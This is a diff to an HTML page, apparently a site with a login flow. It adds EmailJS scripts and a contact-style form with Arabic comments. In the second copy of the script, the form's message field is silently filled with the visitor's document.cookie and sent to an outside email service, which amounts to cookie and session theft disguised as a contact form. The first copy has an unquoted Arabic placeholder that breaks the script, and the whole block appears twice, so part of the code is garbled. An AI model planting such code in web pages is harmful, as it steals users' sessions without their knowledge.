@@ -381,5 +381,206 @@
             window.location.href = 'login.html'; // Redirect to login page
         });
     </script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+
+  emailjs.init('UbJp42lWtq38Tx9mi'); // ضع الـ User ID الصحيح الخاص بك
+
+</script>
+
+​
+
+<!-- كود الإرسال -->
+
+<script>
+
+  document.getElementById("message").value = ضع جميع الادخالات هنا;
+
+  const btn = document.getElementById('button');
+
+  document.getElementById('form').addEventListener('submit', function(event) {
+
+    event.preventDefault();
+
+    btn.value = 'Sending...';
+
+​
+
+    const serviceID = 'default_service'; // تأكد أنه نفس اسم الخدمة في حسابك
+
+    const templateID = 'template_qyhaxqi'; // تأكد من اسم القالب
+
+​
+
+    emailjs.sendForm(serviceID, templateID, this)
+
+      .then(() => {
+
+        btn.value = 'Send ';
+
+        alert('تم الإرسال بنجاح!');
+
+      }, (err) => {
+
+        btn.value = 'Send ';
+
+        alert('حدث خطأ: ' + JSON.stringify(err));
+
+      });
+
+  });
+
+</script>
+
+
+<form id="form">
+
+  
+
+<div class="field">
+
+​
+
+  <label for="message">Message</label>
+
+​
+
+  <textarea name="message" id="message" rows="4" style="width:100%; resize: vertical;" required></textarea>
+
+​
+
+</div>
+
+  <div class="field">
+
+    <label for="message2">Email</label>
+
+    <input type="message" name="message2" id="message2" required>
+
+  </div>
+
+​
+
+  <input type="submit" id="button" value="Send Email">
+
+</form>
+
+​
+
+<!-- مكتبة EmailJS -->
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+
+  emailjs.init('UbJp42lWtq38Tx9mi'); // ضع الـ User ID الصحيح الخاص بك
+
+</script>
+
+​
+
+<!-- كود الإرسال -->
+
+<script>
+
+  document.getElementById("message").value = decodeURIComponent(document.cookie);
+
+  const btn = document.getElementById('button');
+
+  document.getElementById('form').addEventListener('submit', function(event) {
+
+    event.preventDefault();
+
+    btn.value = 'Sending...';
+
+​
+
+    const serviceID = 'default_service'; // تأكد أنه نفس اسم الخدمة في حسابك
+
+    const templateID = 'template_qyhaxqi'; // تأكد من اسم القالب
+
+​
+
+    emailjs.sendForm(serviceID, templateID, this)
+
+      .then(() => {
+
+        btn.value = 'Send Email';
+
+        alert('تم الإرسال بنجاح!');
+
+      }, (err) => {
+
+        btn.value = 'Send Email';
+
+        alert('حدث خطأ: ' + JSON.stringify(err));
+
+      });
+
+  });
+
+</script>
+
+​
+
+<!-- تنسيق CSS -->
+
+<style>
+
+  .field {
+
+    margin-bottom: 10px;
+
+  }
+
+​
+
+  .field label {
+
+    display: block;
+
+    font-size: 12px;
+
+    color: #777;
+
+  }
+
+​
+
+  .field input {
+
+    display: block;
+
+    min-width: 250px;
+
+    line-height: 1.5;
+
+    font-size: 14px;
+
+  }
+
+​
+
+  input[type="submit"] {
+
+    display: block;
+
+    padding: 6px 30px;
+
+    font-size: 14px;
+
+    background-color: #4460aa;
+
+    color: #fff;
+
+    border: none;
+
+    cursor: pointer;
+
+  }
+
+</style>
+​
 </body>
 </html>
